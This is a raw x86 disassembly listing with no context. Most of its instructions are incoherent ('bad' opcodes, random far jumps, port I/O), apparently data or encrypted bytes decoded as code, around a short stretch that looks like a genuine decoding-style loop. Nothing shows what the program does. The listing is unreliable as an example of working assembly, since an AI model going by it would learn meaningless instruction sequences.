  4216aa:	dec    edx
  4216ab:	dec    ecx
  4216ac:	pop    edx
  4216ad:	retf   0xafe5
  4216b0:	sar    BYTE PTR [eax],0x6a
  4216b3:	mov    ebp,0x24c963b7
  4216b9:	fbstp  TBYTE PTR [eax+0x24]
  4216bc:	push   esp
  4216bd:	cmp    ecx,eax
  4216bf:	lea    eax,[edx-0x79]
  4216c2:	stos   DWORD PTR es:[edi],eax
  4216c3:	cwde   
  4216c4:	lds    ecx,FWORD PTR [eax-0x26]
  4216c7:	xchg   esi,eax
  4216c8:	pop    esi
  4216c9:	repz je 0x421744
  4216cc:	lahf   
  4216cd:	popa   
  4216ce:	out    dx,al
  4216cf:	aam    0x37
  4216d1:	mov    DWORD PTR [ecx+0x6a51becf],ecx
  4216d7:	mov    bh,0xec
  4216d9:	icebp  
  4216da:	xchg   edx,eax
  4216db:	loop   0x421713
  4216dd:	stos   BYTE PTR es:[edi],al
  4216de:	or     eax,DWORD PTR [ecx-0x63dd054e]
  4216e4:	pop    ebx
  4216e5:	or     ebp,DWORD PTR [edx+0x4c]
  4216e8:	mov    ?,WORD PTR [ebp-0x3a]
  4216eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ec:	jl     0x421738
  4216ee:	xchg   ecx,eax
  4216ef:	mov    bh,0x33
  4216f1:	fwait
  4216f2:	(bad)  
  4216f3:	enter  0x6cac,0x3a
  4216f7:	pop    es
  4216f8:	sti    
  4216f9:	or     dh,dl
  4216fb:	jp     0x421725
  4216fd:	call   0x81a7e81
  421702:	stos   BYTE PTR es:[edi],al
  421703:	dec    edx
  421704:	es test al,0xe5
  421707:	ss mov esp,0xc04188de
  42170d:	mov    edx,0xfe5dada7
  421712:	and    edi,DWORD PTR [esi]
  421714:	push   edi
  421715:	jl     0x4216a5
  421717:	sbb    BYTE PTR [ebx+0x1b],0x2c
  42171b:	xchg   edi,eax
  42171c:	bound  ebx,QWORD PTR [ebx+eax*4+0x7c]
  421720:	ins    DWORD PTR es:[edi],dx
  421721:	ja     0x421782
  421723:	push   ecx
  421724:	test   DWORD PTR [edx],esp
  421726:	outs   dx,BYTE PTR ds:[esi]
  421727:	aad    0x39
  421729:	jp     0x421713
  42172b:	push   ss
  42172c:	dec    ebx
  42172d:	add    eax,0x2af70719
  421732:	mov    al,ds:0x49371be
  421737:	icebp  
  421738:	push   esp
  421739:	inc    esp
  42173a:	dec    edx
  42173b:	cmp    BYTE PTR [edx-0x4e],cl
  42173e:	loope  0x421782
  421740:	sub    eax,0xd0ff4473
  421745:	dec    edi
  421746:	test   cl,cl
  421748:	nop
  421749:	imul   edi,DWORD PTR [ebx+eiz*8+0x20],0x2066dcbc
  421751:	push   es
  421752:	arpl   bp,si
  421754:	adc    al,0x58
  421756:	sub    DWORD PTR [edx+0xac1d85f],0x1242e201
  421760:	cmp    eax,DWORD PTR [edx+0x599b5a3b]
  421766:	stc    
  421767:	retf   0xcade
  42176a:	cld    
  42176b:	jne    0x4217b4
  42176d:	cdq    
  42176e:	jns    0x421784
  421770:	(bad)  [edx]
  421772:	int3   
  421773:	je     0x421705
  421775:	outs   dx,DWORD PTR ds:[esi]
  421776:	test   DWORD PTR [esi-0x16],edx
  421779:	(bad)  
  42177a:	stc    
  42177b:	xor    BYTE PTR [edx+0x7400a296],0xca
  421782:	loop   0x4217bc
  421784:	jbe    0x421741
  421786:	push   eax
  421787:	push   ss
  421788:	jmp    0x7506:0x4d25b5fa
  42178f:	adc    al,0x11
  421791:	in     al,0x87
  421793:	test   BYTE PTR [edx+0x43],0x2c
  421797:	nop
  421798:	add    ebp,esi
  42179a:	cwde   
  42179b:	enter  0xac88,0x7c
  42179f:	popf   
  4217a0:	popa   
  4217a1:	bswap  ebp
  4217a3:	xor    DWORD PTR [edx+0x4],edx
  4217a6:	or     bl,BYTE PTR [esi]
  4217a8:	xchg   ebx,eax
  4217a9:	xor    ch,BYTE PTR [eax+0x65]
  4217ac:	adc    eax,0x51d65880
  4217b1:	mov    ?,WORD PTR [edi+0x11]
  4217b4:	or     al,0xc3
  4217b6:	ds aad 0xcd
  4217b9:	adc    al,0x4b
  4217bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217bc:	fwait
  4217bd:	sbb    ebp,DWORD PTR [edx+eax*4]
  4217c0:	pop    ebx
  4217c1:	adc    bl,ch
  4217c3:	(bad)  
  4217c5:	mov    al,0x84
  4217c7:	das    
  4217c8:	ja     0x4217b8
  4217ca:	mov    edx,0xe0fcfb23
  4217cf:	shld   DWORD PTR [ebx-0x75],esi,0x26
  4217d4:	int    0x89
  4217d6:	pop    ss
  4217d7:	cmp    DWORD PTR [ebx-0x6f2a0a73],edx
  4217dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217de:	ins    DWORD PTR es:[edi],dx
  4217df:	adc    DWORD PTR [ebp+0x3b5b5423],ebx
  4217e5:	and    DWORD PTR [ecx+edi*2-0x44ced80a],edx
  4217ec:	xor    BYTE PTR [esi],bh
  4217ee:	shr    DWORD PTR [ebx],1
  4217f0:	jb     0x421783
  4217f2:	xor    cl,bl
  4217f4:	jmp    0x9a44:0x60298079
  4217fb:	fisub  WORD PTR [esp+ebp*2+0xbd47e7]
  421802:	ror    BYTE PTR [edx],1
  421804:	(bad)
  421807:	loope  0x4217ca
  421809:	es push eax
  42180b:	xlat   BYTE PTR ds:[ebx]
  42180c:	aam    0xa3
  42180e:	lea    esi,[edi+0x61da9a95]
  421814:	xor    al,0x3e
  421816:	xchg   esp,eax
  421817:	adc    ch,BYTE PTR [edi+0x1e]
  42181a:	neg    BYTE PTR [ebx-0x52]
  42181d:	loopne 0x421802
  42181f:	pop    esp
  421820:	cli    
  421821:	dec    ebp
  421822:	mov    bl,0x1b
  421824:	mov    DWORD PTR [ebp+0x67b0deb4],eax
  42182a:	or     edx,DWORD PTR [edi+ebp*8]
  42182d:	xchg   ecx,eax
  42182e:	scas   al,BYTE PTR es:[edi]
  42182f:	ret    0x48d
  421832:	in     al,dx
  421833:	pusha  
  421834:	jns    0x4217db
  421836:	repnz inc esp
  421838:	mov    esi,0xc414e5f7
  42183d:	sbb    eax,0xd6ef4af
  421842:	mov    edi,0xc371b603
  421847:	daa    
  421848:	(bad)  
  421849:	xor    BYTE PTR [ecx+0x65c26308],ch
  42184f:	stos   DWORD PTR es:[edi],eax
  421850:	rcr    al,cl
  421852:	lods   al,BYTE PTR ds:[esi]
  421854:	add    dl,BYTE PTR ds:0x201f27de
  42185a:	test   BYTE PTR [ecx-0x37],al
  42185d:	ss sti 
  42185f:	stos   BYTE PTR es:[edi],al
  421860:	xchg   esi,eax
  421861:	push   cs
  421862:	ja     0x4218ca
  421864:	xchg   BYTE PTR [edi+0x27],ch
  421867:	lahf   
  421868:	xor    esi,eax
  42186a:	scas   eax,DWORD PTR es:[edi]
  42186b:	jne    0x42181e
  42186d:	mov    dh,0xbc
  42186f:	outs   dx,DWORD PTR ds:[esi]
  421870:	mov    edx,0x46d328d1
  421875:	mov    ebp,0xdc52c177
  42187a:	add    esi,DWORD PTR [edi]
  42187c:	mov    BYTE PTR [edi+0x76e1947a],ah
  421882:	inc    ebx
  421883:	daa    
  421884:	jp     0x4218a4
  421886:	or     BYTE PTR [esi+eax*2-0x4],dl
  42188a:	cmp    dh,bl
  42188c:	or     al,0xc6
  42188e:	mov    DWORD PTR [esi+0x3d627d3a],eax
  421894:	fmul   DWORD PTR [ecx-0x31]
  421897:	out    0x9d,al
  421899:	mov    ?,WORD PTR [eax+0x19]
  42189c:	cmp    ah,BYTE PTR [eax]
  42189e:	mov    sp,0x51d9
  4218a2:	ja     0x421892
  4218a4:	mov    ebp,edx
  4218a6:	mov    bl,BYTE PTR [edi-0x7d]
  4218a9:	fucomip st,st(0)
  4218ab:	adc    edi,DWORD PTR [eax+ebx*4-0x8]
  4218af:	(bad)  
  4218b1:	jg     0x421906
  4218b3:	pusha  
  4218b4:	gs gs inc ebx
  4218b7:	xor    edx,ebx
  4218b9:	fwait
  4218ba:	pop    ds
  4218bb:	push   esp
  4218bc:	loop   0x4218f1
  4218be:	jp     0x421879
  4218c0:	icebp  
  4218c1:	xor    edx,DWORD PTR [esi-0x45579058]
  4218c7:	sbb    esp,DWORD PTR [ebx]
  4218c9:	mov    esp,0x1fe457ed
  4218ce:	and    dh,BYTE PTR [esi+0x506e06be]
  4218d4:	push   ebx
  4218d5:	jnp    0x4218ff
  4218d7:	cld    
  4218d8:	xor    DWORD PTR ds:0x5e80ac4f,esi
  4218de:	mov    ch,0x54
  4218e0:	jg     0x42188e
  4218e2:	mov    esp,0x485f5af9
  4218e7:	mov    ds:0x8f462ec4,al
  4218ec:	adc    ah,BYTE PTR [edi+0x79]
  4218ef:	push   0xffffffd5
  4218f1:	aam    0xac
  4218f3:	mov    al,0xbb
  4218f5:	cmp    al,0x5a
  4218f7:	push   ss
  4218f8:	pusha  
  4218f9:	repnz (bad) 
  4218fb:	mov    edi,0xf6c3d653
  421900:	ret    
  421901:	test   al,dh
  421903:	and    esp,0xffffffd3
  421906:	push   ecx
  421907:	jmp    0x52e7e2ab
  42190c:	aam    0xd7
  42190e:	sti    
  42190f:	out    dx,eax
  421910:	ja     0x4218e0
  421912:	mov    esi,0x10efe9b8
  421917:	adc    edx,edx
  421919:	and    dh,BYTE PTR [eax-0x34840387]
  42191f:	shl    DWORD PTR [eax+0x74b08402],cl
  421925:	mov    WORD PTR [ecx+0x52],cs
  421928:	out    0x9c,eax
  42192a:	popa   
  42192b:	popf   
  42192c:	shl    BYTE PTR [edx],cl
  42192e:	test   eax,0x6c35477f
  421933:	loopne 0x421917
  421935:	pushf  
  421936:	xor    eax,0x9435ef5d
  42193b:	clc    
  42193c:	jmp    0x421932
  42193e:	fmul   QWORD PTR [ecx+ebp*2]
  421941:	mov    esi,0x30ed0656
  421946:	in     al,0x7b
  421948:	dec    edi
  421949:	jne    0x4218f0
  42194b:	daa    
  42194c:	jno    0x421922
  42194e:	imul   eax,DWORD PTR [edx],0x47ba1fd
  421954:	imul   ebx,DWORD PTR [eax+eax*2],0xad8e7bd9
  42195b:	push   edi
  42195c:	add    DWORD PTR [ebp-0x3c],edi
  42195f:	pop    ss
  421960:	pop    ebx
  421961:	out    dx,al
  421962:	outs   dx,DWORD PTR ds:[esi]
  421963:	lahf   
  421964:	mov    bl,0xd5
  421966:	mov    cl,0xd
  421968:	dec    ebx
  421969:	icebp  
  42196a:	or     bh,BYTE PTR [esi]
  42196c:	(bad)  
  42196d:	dec    edi
  42196e:	aad    0x47
  421970:	sar    BYTE PTR [esi-0x26087c1d],0x50
  421977:	imul   ecx,DWORD PTR [eax-0xd03fc61],0x9ae24ce2
  421981:	add    esi,DWORD PTR ds:[edi-0x38b2b047]
  421988:	mov    ds:0x9bc53429,eax
  42198d:	jno    0x4219e7
  42198f:	inc    ecx
  421990:	sbb    DWORD PTR [ebp-0x52e7d616],esp
  421996:	inc    esp
  421997:	inc    edx
  421998:	cwde   
  421999:	aam    0xd2
  42199b:	push   esi
  42199c:	mov    ds:0xf2cefdd,al
  4219a1:	test   BYTE PTR [esi-0x4c1e0e0],bl
  4219a7:	pop    esp
  4219a8:	push   ecx
  4219a9:	lds    esi,FWORD PTR [ecx+0xa02e300]
  4219af:	shl    DWORD PTR [eax-0x3c],0x9a
  4219b3:	js     0x4219d9
  4219b5:	aad    0x8d
  4219b7:	xchg   BYTE PTR ds:0xa7ab4573,dh
  4219bd:	mov    ebp,0x2a44d58b
  4219c2:	xor    al,0x42
  4219c4:	jmp    0xd5426716
  4219c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ca:	mov    esi,0xb5f81da
  4219cf:	cwde   
  4219d0:	jb     0x421a2f
  4219d2:	lahf   
  4219d3:	add    ah,al
  4219d5:	es adc eax,esp
  4219d8:	xchg   BYTE PTR [edi+0x1c34b247],dh
  4219de:	push   edi
  4219df:	call   0x5afbf189
  4219e4:	test   ecx,0x8179547b
  4219ea:	push   ecx
  4219eb:	or     ah,BYTE PTR [ecx-0x4176841c]
  4219f1:	mov    ah,BYTE PTR gs:[edi-0x4f4cc542]
  4219f8:	and    edx,DWORD PTR [eax+esi*1]
  4219fb:	mov    dl,0xcb
  4219fd:	mov    cs,WORD PTR [edi*8+0x3d366090]
  421a04:	scas   al,BYTE PTR es:[edi]
  421a05:	or     al,0x2c
  421a07:	cli    
  421a08:	and    DWORD PTR [ebx],esi
  421a0a:	out    0x7,al
  421a0c:	jnp    0x421a03
  421a0e:	pop    esi
  421a0f:	xchg   DWORD PTR [ebp+ebx*4-0x69],esi
  421a13:	gs dec edx
  421a15:	pop    es
  421a16:	leave  
  421a17:	aas    
  421a18:	enter  0x9388,0x21
  421a1c:	mov    edx,0x6b53619b
  421a21:	cld    
  421a22:	ds ja  0x4219c3
  421a25:	retf   
  421a26:	mov    ch,0x23
  421a28:	mov    ah,0x25
  421a2a:	or     al,0xc7
  421a2c:	es add ah,0xed
  421a30:	pop    ecx
  421a31:	scas   al,BYTE PTR es:[edi]
  421a32:	in     al,0x7d
  421a34:	scas   al,BYTE PTR es:[edi]
  421a35:	add    DWORD PTR [ecx+0x79],ecx
  421a38:	pop    ds
  421a39:	add    ch,bh
  421a3b:	or     eax,DWORD PTR [edx]
  421a3d:	mov    ebx,0x1745088b
  421a42:	mov    edx,0x764e6704
  421a47:	das    
  421a48:	iret   
  421a49:	jg     0x421a65
  421a4b:	mov    bl,0x7a
  421a4d:	jmp    0x7ca187ed
  421a52:	bound  edi,QWORD PTR [ebx]
  421a54:	into   
  421a55:	mov    esi,DWORD PTR [esp+edx*4-0x76b197cc]
  421a5c:	test   BYTE PTR [ebx-0x67],ah
  421a5f:	(bad)  
  421a60:	(bad)  [edi+edx*8+0x7a]
  421a64:	retf   0x3b2f
  421a67:	mov    esp,0x3df1f029
  421a6c:	push   esp
  421a6d:	fcom   st(3)
  421a6f:	psrld  mm2,mm2
  421a72:	outs   dx,DWORD PTR ds:[esi]
  421a73:	jno    0x421a08
  421a75:	add    edi,esi
  421a77:	test   dh,al
  421a79:	std    
  421a7a:	sub    BYTE PTR [ecx+eiz*1+0x57ba31e8],0x83
  421a82:	push   esp
  421a83:	ins    DWORD PTR es:[edi],dx
  421a84:	mov    al,0xfa
  421a86:	aaa    
  421a87:	cmp    ecx,DWORD PTR [eax-0x7def55e3]
  421a8d:	push   edi
  421a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a8f:	xchg   ebx,ecx
  421a91:	stos   DWORD PTR es:[edi],eax
  421a92:	pop    esi
  421a93:	add    dl,BYTE PTR [edi]
  421a95:	jle    0x421a3c
  421a97:	xor    DWORD PTR ds:0x635480db,ecx
  421a9d:	jmp    0xd62:0xf3eae72a
  421aa4:	push   ss
  421aa5:	xlat   BYTE PTR ds:[ebx]
  421aa6:	lahf   
  421aa7:	xor    BYTE PTR [ecx+eiz*8+0x6be168c],0x49
  421aaf:	mov    dl,BYTE PTR ds:0x8dc46f49
  421ab5:	rcl    ch,cl
  421ab7:	(bad)  
  421ab9:	or     al,0x81
  421abb:	sub    edi,DWORD PTR [edx]
  421abd:	aad    0x60
  421abf:	in     al,dx
  421ac0:	aad    0xb3
  421ac2:	adc    edi,ebx
  421ac4:	dec    esp
  421ac5:	stc    
  421ac6:	jno    0x421a9e
  421ac8:	stos   BYTE PTR es:[edi],al
  421ac9:	sub    DWORD PTR cs:[edi+0x13850f43],edi
  421ad0:	add    BYTE PTR [eax],al
  421ad2:	add    BYTE PTR [ebx],bh
  421ad4:	pop    ebp
  421ad5:	hlt    
  421ad6:	je     0x423f0d
  421adc:	jmp    0x421ae6
  421ae1:	mov    esi,0x3272f8
  421ae6:	mov    eax,DWORD PTR [ebp-0x4]
  421ae9:	mov    edi,DWORD PTR [ebp-0x8]
  421aec:	xor    edi,edx
  421aee:	add    edi,esi
  421af0:	mov    esi,DWORD PTR [ebp+0x8]
  421af3:	imul   edi,ecx
  421af6:	mov    ebx,DWORD PTR [ebp+0xc]
  421af9:	xor    eax,edx
  421afb:	add    eax,ecx
  421afd:	mov    al,BYTE PTR [ebx+eax*1+0x3272f8]
  421b04:	mov    BYTE PTR [edi+esi*1],al
  421b07:	mov    eax,DWORD PTR [ebp-0x8]
  421b0a:	mov    esi,DWORD PTR [ebp+0x10]
  421b0d:	xor    eax,edx
  421b0f:	xor    ebx,ebx
  421b11:	add    esi,0xfabdbecf
  421b17:	adc    ebx,0xffffffff
  421b1a:	lea    ecx,[ecx+eax*1+0x3272f8]
  421b21:	xor    edi,edi
  421b23:	xor    esi,0x8a29a145
  421b29:	jmp    0x423ee8
  421b2e:	int    0x95
  421b30:	stos   BYTE PTR es:[edi],al
  421b31:	jmp    0xff36:0x517a
  421b37:	dec    ebx
  421b38:	jnp    0x421b18
  421b3a:	or     esi,DWORD PTR [edi-0x57]
  421b3d:	and    DWORD PTR [ebx],0x47
  421b40:	jl     0x421bbd
  421b42:	sbb    eax,0xfd7b7b9e
  421b47:	arpl   WORD PTR [eax],cx
  421b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b4a:	and    esi,DWORD PTR ds:0x24b04a13
  421b50:	cwde   
  421b51:	rol    BYTE PTR [ebp-0x6f],0x7a
  421b55:	jae    0x421b6a
  421b57:	(bad)  
  421b58:	ficomp WORD PTR [ebp-0x7e7ecc20]
  421b5e:	pop    ss
  421b5f:	pusha  
  421b60:	icebp  
  421b61:	mov    ebx,0xf6ff97f1
  421b66:	sbb    DWORD PTR [edx-0x7c1c6de2],edx
  421b6c:	scas   eax,DWORD PTR es:[edi]
  421b6d:	pop    ebx
  421b6e:	jge    0x421afe
  421b70:	shl    edi,0x3e
  421b73:	in     al,0x35
  421b75:	cli    
  421b76:	and    ax,0x88b1
  421b7a:	jle    0x421b36
  421b7c:	pop    ds
  421b7d:	cdq    
  421b7e:	sahf   
  421b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b80:	arpl   WORD PTR [edx+eax*4],cx
  421b83:	xchg   edi,eax
  421b84:	mov    ds:0x3dbf63c2,eax
  421b89:	jmp    0xcfa:0xac652cb7
  421b90:	mov    DWORD PTR [esi-0x2672c31c],edx
  421b96:	test   eax,0x918d967f
  421b9b:	add    BYTE PTR [edi+edi*8-0x2f],bl
  421b9f:	fninit 
  421ba1:	push   edx
  421ba2:	mov    al,ds:0x6f9173c1
  421ba7:	inc    ebp
  421ba8:	std    
  421ba9:	(bad)  
  421baa:	outs   dx,DWORD PTR ds:[esi]
  421bab:	jmp    0x421ba5
  421bad:	pushf  
  421bae:	xlat   BYTE PTR ds:[ebx]
  421baf:	mov    eax,0x83be11fe
  421bb4:	sub    BYTE PTR [eax-0x60],bl
  421bb7:	inc    edx
  421bb8:	dec    ecx
  421bb9:	adc    eax,0x974586f3
  421bbe:	(bad)  
  421bbf:	xor    BYTE PTR [edx+0x3a],bl
  421bc2:	mov    al,ds:0xebde77b2
  421bc7:	mov    al,0xd1
  421bc9:	mov    ss,WORD PTR [ebx+0x144163e4]
  421bcf:	add    BYTE PTR [edi],bh
  421bd1:	outs   dx,BYTE PTR ds:[esi]
  421bd2:	pop    ebx
  421bd3:	or     esp,DWORD PTR [ebp+0x5e]
  421bd6:	jno    0x421c07
  421bd8:	jmp    0x43c2:0x561e656f
  421bdf:	aaa    
  421be0:	add    al,0xc6
  421be2:	icebp  
  421be3:	shl    esp,cl
  421be5:	pop    ecx
  421be6:	ins    BYTE PTR es:[edi],dx
  421be7:	or     al,0x18
  421be9:	scas   eax,DWORD PTR es:[edi]
  421bea:	popa   
  421beb:	sahf   
  421bec:	push   esp
  421bed:	pusha  
  421bee:	sbb    ecx,esi
  421bf0:	call   0x597311f2
  421bf5:	lock xor ebp,DWORD PTR [esi+ebp*2+0x63]
  421bfa:	pop    edi
  421bfb:	pop    ebx
  421bfc:	adc    DWORD PTR [eax-0x38256654],eax
  421c02:	xchg   edi,eax
  421c03:	adc    al,0x7b
  421c05:	mov    ch,0x2a
  421c07:	es out 0x23,al
  421c0a:	sbb    BYTE PTR [edi+0x6a],cl
  421c0d:	popa   
  421c0e:	aam    0xa7
  421c10:	int    0xda
  421c12:	pop    esi
  421c13:	outs   dx,BYTE PTR ds:[esi]
  421c14:	mov    edx,0xec8561fa
  421c19:	test   BYTE PTR [edi+0x363b196e],al
  421c1f:	xchg   edx,eax
  421c20:	and    edi,edi
  421c22:	xor    DWORD PTR [ebp-0x1248d5b3],ebx
  421c28:	jmp    0x421be0
  421c2a:	push   0xfafce575
  421c2f:	addr16 jb 0x421bf9
  421c32:	div    DWORD PTR [edi-0x21fbf9db]
  421c38:	or     ch,BYTE PTR [edx+0x7fc0b5f2]
  421c3e:	dec    esp
  421c3f:	push   eax
  421c40:	sbb    eax,0x394e17b1
  421c45:	jl     0x421bff
  421c47:	rcr    dh,1
  421c49:	sub    DWORD PTR [esi],eax
  421c4b:	xor    al,0x7f
  421c4d:	pop    ss
  421c4e:	sub    bh,bl
  421c50:	jb     0x421cc2
  421c52:	inc    ebx
  421c53:	dec    eax
  421c54:	sbb    edi,DWORD PTR [edi]
  421c56:	popf   
  421c57:	retf   
  421c58:	loop   0x421ca0
  421c5a:	dec    DWORD PTR [ebx]
  421c5c:	sbb    ebp,eax
  421c5e:	je     0x421c24
  421c60:	pushf  
  421c61:	int3   
  421c62:	or     ch,BYTE PTR ds:0x92153734
  421c68:	and    al,0x16
  421c6a:	cmp    al,0x1b
  421c6c:	loope  0x421c78
  421c6e:	shr    BYTE PTR [edi+0x5381d363],cl
  421c74:	gs jmp 0xf7388753
  421c7a:	mov    edi,0x974e3ff5
  421c7f:	aaa    
  421c80:	cmc    
  421c81:	xchg   esi,eax
  421c82:	outs   dx,BYTE PTR ds:[esi]
  421c83:	int    0x4
  421c85:	pop    ebp
  421c86:	aad    0x1a
  421c88:	(bad)  [ebx-0x76]
  421c8b:	gs xchg al,cl
  421c8e:	mov    ah,0x1d
  421c90:	mov    ds:0xd45d0e77,al
  421c95:	cwde   
  421c96:	sub    eax,0x8bfea781
  421c9b:	xor    ch,al
  421c9d:	sub    edi,DWORD PTR [ebx+edx*2-0x7b]
  421ca1:	outs   dx,DWORD PTR ds:[esi]
  421ca2:	sbb    BYTE PTR [eax],al
  421ca4:	mov    ebx,esp
  421ca6:	adc    bh,dl
  421ca8:	jecxz  0x421ce9
  421caa:	xchg   esi,eax
  421cab:	mov    ebx,0x583d0be4
  421cb0:	ret    0x165
  421cb3:	fcmovne st,st(7)
  421cb5:	pop    ss
  421cb6:	inc    eax
  421cb7:	imul   eax,DWORD PTR ss:[ebx],0xcfbeb465
  421cbe:	retf   0x3f5a
  421cc1:	xor    esi,edi
  421cc3:	hlt    
  421cc4:	cwde   
  421cc5:	push   ecx
  421cc6:	jg     0x421d3e
  421cc8:	call   0x5fcf2d6c
  421ccd:	imul   eax,DWORD PTR [edi+ebp*2+0x4007c897],0xffffffcd
  421cd5:	sbb    bh,BYTE PTR ds:0x2c1c2beb
  421cdb:	or     ecx,DWORD PTR [ebx+ecx*4-0x7eda60de]
  421ce2:	xor    eax,DWORD PTR [eax+0x6e]
  421ce5:	jbe    0x421d59
  421ce7:	sub    BYTE PTR [ecx],bh
  421ce9:	mov    esp,0xd173c457
  421cee:	xor    ebp,DWORD PTR [esp+esi*4]
  421cf1:	or     al,0xd3
  421cf3:	pop    ebx
  421cf4:	fimul  WORD PTR [edx+0x44]
  421cf7:	fmul   QWORD PTR [edx+0x1f]
  421cfa:	mov    ah,0xca
  421cfc:	or     al,0x42
  421cfe:	ja     0x421cac
  421d00:	sti    
  421d01:	jmp    0x99083b6d
  421d06:	xchg   ebp,eax
  421d07:	pop    ecx
  421d08:	outs   dx,BYTE PTR ds:[esi]
  421d09:	mov    dl,0xc2
  421d0b:	inc    ebx
  421d0c:	add    DWORD PTR [edx],eax
  421d0e:	loope  0x421d2b
  421d10:	inc    eax
  421d11:	pop    ebx
  421d12:	dec    eax
  421d13:	mov    bl,0x1f
  421d15:	cmp    DWORD PTR [edi],esp
  421d17:	ins    DWORD PTR es:[edi],dx
  421d18:	in     al,0x14
  421d1a:	imul   ecx,ecx,0xb413d5be
  421d20:	cld    
  421d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d22:	push   edi
  421d23:	call   0xefe2b796
  421d28:	mov    cl,ch
  421d2a:	jne    0x421d7c
  421d2c:	test   bl,ah
  421d2e:	xchg   DWORD PTR [edx+0x6e52cfa0],esi
  421d34:	clc    
  421d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d36:	mov    ch,0x19
  421d38:	jge    0x421d5b
  421d3a:	cld    
  421d3b:	cmc    
  421d3c:	push   esi
  421d3d:	test   al,0x1f
  421d3f:	int3   
  421d40:	call   0x778:0xffdf0c8
  421d47:	or     eax,0xc5f11a15
  421d4c:	add    esp,ecx
  421d4e:	shl    DWORD PTR [ecx],1
  421d50:	sub    DWORD PTR [edi+ebx*4-0x46920c6],ecx
  421d57:	pop    ecx
  421d58:	outs   dx,BYTE PTR ds:[esi]
  421d59:	or     dh,dh
  421d5b:	sbb    BYTE PTR [ebp-0x31],ch
  421d5e:	jns    0x421da5
  421d60:	or     bh,al
  421d62:	jg     0x421dd3
  421d64:	mov    ebx,0x9b4a20df
  421d69:	aam    0xc2
  421d6b:	outs   dx,DWORD PTR ds:[esi]
  421d6c:	stos   DWORD PTR es:[edi],eax
  421d6d:	das    
  421d6e:	adc    eax,0xfa9e671f
  421d73:	idiv   DWORD PTR [esi+ebp*8]
  421d76:	scas   al,BYTE PTR es:[edi]
  421d77:	lods   eax,DWORD PTR ds:[esi]
  421d78:	sub    ah,BYTE PTR [edx]
  421d7a:	jg     0x421dee
  421d7c:	popf   
  421d7d:	(bad)
  421d80:	in     al,0x8d
  421d82:	mov    ch,0x15
  421d84:	cdq    
  421d85:	inc    edi
  421d86:	pop    esp
  421d87:	cmp    DWORD PTR [ebp-0x5d],0x20
  421d8b:	ins    DWORD PTR es:[edi],dx
  421d8c:	cs push 0xffffffb2
  421d8f:	mov    DWORD PTR [ebp-0x29],edi
  421d92:	xchg   esp,eax
  421d93:	outs   dx,BYTE PTR ds:[esi]
  421d94:	inc    esp
  421d95:	(bad)  
  421d96:	dec    esp
  421d97:	into   
  421d98:	icebp  
  421d99:	fwait
  421d9a:	mov    ds,WORD PTR [ecx+0x6b1cce46]
  421da0:	xchg   ecx,eax
  421da1:	jp     0x421d73
  421da3:	fmul   QWORD PTR [eax+0x69]
  421da6:	ficomp WORD PTR [edx+0x6f]
  421da9:	xchg   ebx,eax
  421daa:	fbld   TBYTE PTR [edi+0x4d4ec537]
  421db0:	jmp    0x421d77
  421db2:	(bad)  
  421db3:	std    
  421db4:	pop    esp
  421db5:	fnstcw WORD PTR [ebx-0x495cadf3]
  421dbb:	test   DWORD PTR [eax],edi
  421dbd:	imul   esp,DWORD PTR [ecx+edx*2+0x14],0x48407b1d
  421dc5:	ins    DWORD PTR es:[edi],dx
  421dc6:	cdq    
  421dc7:	rcr    BYTE PTR [esp+ebp*4],1
  421dca:	in     al,0x55
  421dcc:	loopne 0x421e04
  421dce:	mov    bh,0x3d
  421dd0:	in     eax,0x95
  421dd2:	jnp    0x421df2
  421dd4:	xlat   BYTE PTR ds:[ebx]
  421dd5:	cmp    DWORD PTR [ecx],ebx
  421dd7:	cmp    edi,DWORD PTR [esi]
  421dd9:	cmp    cl,BYTE PTR [ebx+eiz*1-0x1639d8ab]
  421de0:	jb     0x421daa
  421de2:	push   0xfffffff9
  421de4:	and    al,0x76
  421de6:	les    edx,FWORD PTR cs:[edi-0x44]
  421dea:	dec    esi
  421deb:	cwde   
  421dec:	add    edx,DWORD PTR [ebx+0x2f]
  421def:	jmp    0xf62aeef8
  421df4:	call   0x7d90:0x513a5012
  421dfb:	mov    cl,BYTE PTR [edx]
  421dfd:	pusha  
  421dfe:	push   esi
  421dff:	in     eax,dx
  421e00:	push   ecx
  421e01:	out    0x1d,eax
  421e03:	out    dx,eax
  421e04:	inc    esi
  421e05:	mov    DWORD PTR [ebx-0x5],esp
  421e08:	outs   dx,BYTE PTR ds:[esi]
  421e09:	cs fwait
  421e0b:	xchg   BYTE PTR [ecx],dl
  421e0d:	or     eax,DWORD PTR [esi+0x3b]
  421e10:	(bad)  
  421e11:	and    bl,BYTE PTR [ebx-0x78]
  421e14:	sbb    ebp,ecx
  421e16:	arpl   WORD PTR [ebp+ecx*2+0x609c808b],bp
  421e1d:	rol    BYTE PTR [ebx-0x70697400],0x9
  421e24:	out    dx,al
  421e25:	sub    bh,BYTE PTR [ebx+0xdcb4676]
  421e2b:	(bad)  
  421e2c:	aad    0xc5
  421e2e:	sub    eax,0x2c19345
  421e33:	leave  
  421e34:	adc    ah,BYTE PTR [eax-0x6f]
  421e37:	stos   BYTE PTR es:[edi],al
  421e38:	mov    ebp,0xf86be4c5
  421e3d:	add    al,0xe0
  421e3f:	xor    BYTE PTR [ecx-0x3e],cl
  421e42:	and    eax,0x9d938757
  421e47:	jae    0x421ea7
  421e49:	ret    0x2058
  421e4c:	mul    BYTE PTR [edx+0x52a4923a]
  421e52:	dec    edi
  421e53:	and    ch,0x45
  421e56:	xor    BYTE PTR [ebx],ah
  421e58:	dec    ebx
  421e59:	mov    edx,0xae4c3d51
  421e5e:	out    0xa2,al
  421e60:	cmp    esi,DWORD PTR ss:[edx-0xff6b57e]
  421e67:	mov    dh,0xf4
  421e69:	int3   
  421e6a:	popa   
  421e6b:	lods   eax,DWORD PTR ds:[esi]
  421e6c:	aad    0x7a
  421e6e:	sbb    bh,BYTE PTR cs:[ebx]
  421e71:	hlt    
  421e72:	ja     0x421edc
